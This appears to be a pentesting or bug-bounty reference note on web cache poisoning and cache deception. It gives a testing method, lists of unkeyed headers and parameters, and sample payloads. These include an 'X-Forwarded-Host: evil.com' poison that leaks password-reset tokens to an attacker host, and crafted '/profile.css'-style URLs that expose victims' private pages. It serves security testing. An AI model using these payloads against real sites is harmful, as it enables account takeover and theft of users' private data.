# Web Cache Poisoning and Deception

The cache stores a response keyed on a subset of the request. Anything unkeyed that
changes the response is a poison.

---

## Method

1. Find a cacheable response (`X-Cache: Hit`, `Age:`, `CF-Cache-Status: HIT`).
2. Find an input that changes the body but is not in the cache key.
3. Send it, then request the clean URL and see your value.

---

## Unkeyed inputs to try

```
X-Forwarded-Host  X-Forwarded-Scheme  X-Forwarded-Proto  X-Host  X-Original-URL
X-Rewrite-URL  X-Forwarded-Prefix  X-HTTP-Method-Override  X-Forwarded-Port
?utm_source=  ?callback=  ?_=  ;param  .json  Accept-Encoding
```

---

## Classic poisons

**Host header** — reset links and absolute URLs in the cached HTML:

```
X-Forwarded-Host: evil.com
→ cached page contains https://evil.com/reset?token=...
```

**Redirect** — `X-Forwarded-Proto: http` on a page that 301s to https → cached 301 to
`http://`, then a MITM.

**Path confusion** — `/x/..%2fstatic/app.js` cached under `/static/app.js` while the
origin resolves it to `/x/`.

**Parameter cloaking** — `?a=1;b=2` where the cache keys `a` and the app reads `b`.

---

## Cache deception

Different from poisoning: you make the cache store a *private* page under a *public* URL.

```
/profile          → private, not cached
/profile.css      → app returns /profile, cache stores it as a static asset
/profile/..%2fprofile
/account;.css
/profile?x=.css
```

Then request `/profile.css` unauthenticated and read the victim's data. Requires the
victim to visit your crafted URL.

---

## Confirmation discipline

- Always use a unique cache-buster (`?cb=<rand>`) when testing poison *content*, then
  remove it to test whether the poison persists.
- Check `Age` — a rising `Age` means you are reading a cached copy.
- Verify from a second IP/session.

---

## Go deeper

1. Map which extensions are cached (`.css`, `.js`, `.png`, `.ico`).
2. Test whether the cache honours `Vary` correctly.
3. Test `X-Forwarded-Host` on every cached HTML page.
4. Test cache deception on `/profile`, `/billing`, `/settings`, `/api/me`.
5. Chain poison → stored XSS for a persistent, no-interaction bug.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
